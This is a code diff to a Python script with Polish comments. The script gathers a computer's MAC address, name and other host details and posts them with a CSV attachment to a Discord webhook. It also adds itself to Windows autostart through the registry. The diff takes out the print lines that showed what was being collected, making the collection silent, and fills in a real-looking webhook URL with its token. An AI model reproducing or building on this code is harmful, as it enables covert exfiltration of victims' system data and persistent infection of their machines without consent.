@@ -73,7 +73,7 @@ def get_ipv6_address():
 def get_mac_address():
     try:
         mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
-        print(f"Adres MAC: {mac_address}")
+
         return mac_address
     except Exception as e:
         return None
@@ -82,7 +82,7 @@ def get_mac_address():
 def get_computer_name():
     try:
         computer_name = platform.node()
-        print(f"Nazwa komputera: {computer_name}")
+
         return computer_name
     except Exception as e:
         return None
@@ -182,7 +182,7 @@ if __name__ == '__main__':
             }
 
             # Wyślij dane na Discord webhook
-            webhook_url = 'WEBHOOK_URL'
+            webhook_url = 'https://discord.com/api/webhooks/1149379147110568068/ww9KswfDYRLONYA4yiFsDkeZvX9VcVhe7IO9KVGbP1bdcoFYDD-563-86TI0kehseu7w'
             response = requests.post(webhook_url, json=data)
 
             # Wyślij plik CSV jako załącznik
@@ -217,7 +217,7 @@ if __name__ == '__main__':
                 winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, os.path.abspath(sys.argv[0]))
                 winreg.CloseKey(key)
             except Exception as e:
-                print(f"Błąd podczas dodawania aplikacji do autostartu: {str(e)}")
+
                 add_to_startup()
             finally:
                 shutil.rmtree(temp_dir, ignore_errors=True)
@@ -225,4 +225,4 @@ if __name__ == '__main__':
         add_to_startup()
 
     except Exception as e:
-        print(f"Wystąpił błąd: {str(e)}")
+        print(f"ERROR {str(e)}")
